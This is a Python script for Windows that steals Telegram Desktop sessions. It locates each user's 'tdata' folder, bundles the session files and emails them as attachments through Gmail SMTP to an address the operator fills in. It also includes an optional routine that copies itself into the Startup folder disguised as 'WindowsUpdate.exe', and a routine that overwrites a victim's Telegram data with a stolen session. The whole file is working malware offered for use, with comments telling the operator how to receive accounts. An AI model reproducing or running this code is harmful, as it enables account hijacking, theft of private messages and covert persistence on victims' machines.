import os,shelve,smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
user = 0
uniq = 'dgeydg377r623ttr738trg3rt37tr37ryir7y32978r9y3987r19gr91ry1g96g94yg791gt9gtt914t9461yrhufrbrjfjdshhe87r823r6t3287r3yr1gfyr9743yt84hfyg7r73udgf4yg93fyg.txt'
NOT_REQUIRE=('prefix','settings0','settings1','shortcuts-custom.json','shortcuts-default.json','usertag','working','dumps','user_data')
def get_all(way):
    res=[]
    for i in os.listdir(way):
        if os.path.isfile(way+"\\"+i):
            res.append(way+"\\"+i)
        else:
            res.extend(get_all(way+'\\'+i))
    return res
def find_way_data():
    for i in os.listdir('C:\\Users'):
        if os.path.exists("C:\\Users\\"+i+"\\AppData\\Roaming\\Telegram Desktop\\tdata"):
            return "C:\\Users\\"+i+"\\AppData\\Roaming\\Telegram Desktop\\tdata"
def get_data():
    all_way = find_way_data()
    answer = dict()
    files = list(filter(lambda i : not i.split("\\")[7] in NOT_REQUIRE, get_all(all_way)))
    for i in files:
        with open(i,'rb') as f:
            answer[i] = f.read()
    return answer
def write_data(way,data):
    with shelve.open(way,'n') as db:
        db['value'] = data
def read_data(way):
    data=0
    with shelve.open(way,'r') as db:
        data=db['value']
    return data
def find_aviable_way():
    t = list(os.walk("c:\\Users\\"))
    t = list(map(lambda i : i[0], t))
    for way in t:
        try:
            open(way+'\\'+uniq,'w').close()
            os.remove(way+'\\'+uniq)
            return way
        except:
            pass
def write_files(way,data):
    if not os.path.exists(way+'\\'+'tdata'):
        os.mkdir(way+'\\'+'tdata')
    way=way+'\\'+'tdata\\'
    data_files=[]
    for i in data.keys():
        pr="\\".join(i.split('\\')[:7])
        data_files.append("\\".join(i.split('\\')[7:]))
    for ways in data_files:
        for i in range(len(ways.split("\\"))-1):
            if not os.path.exists(way+'\\'+ways.split("\\")[i]):
                os.mkdir(way+'\\'+ways.split("\\")[i])
        with open(way+ways,'wb') as f:
            f.write(data[pr+'\\'+ways])
def get_copy_data(way = ''):
    data = get_data()
    if way =='':
        way = find_aviable_way()
    write_data(way+'\\'+uniq,data)
    return way
def set_copy_data(way):
    data = read_data(way+'\\'+uniq)
    write_files(find_way_data()[:-6],data)
def send_files(files):
    msg = MIMEMultipart()
    for file in files:
        part = MIMEBase('application', "octet-stream")
        part.set_payload( open(file,"rb").read() )
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="{0}"'.format(os.path.basename(file)))
        msg.attach(part)
    msg['Subject'] = 'Telegram'
    msg['From'] = mail
    msg['To'] = mail

    s=smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(mail,password)
    s.send_message(msg)
    s.quit()
def auto_load():
    with open(__file__,'rb') as f:
        text = f.read()
    try:
        with open('C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\WindowsUpdate.exe','wb') as f:
            f.write(text)
    except:
        pass
def start_get():
    w = get_copy_data()
    files = [w+'\\'+uniq+i for i in ['.bak','.dir','.dat']]
    send_files(files)
    try:
        for i in files:
            os.remove(i)
    except:
        pass
def start_set(addr=''):
    way = find_way_data()
    for i in os.listdir(way):
        try:
            os.remove(way+'\\'+i)
        except:
            pass
    set_copy_data(addr)

mail = '' #your mail in quotes
password = '' #your password in quotes 
#auto_load()
start_get() #to get account to your mail
#start_set('D:\\dict')  #to set account from chosen directory
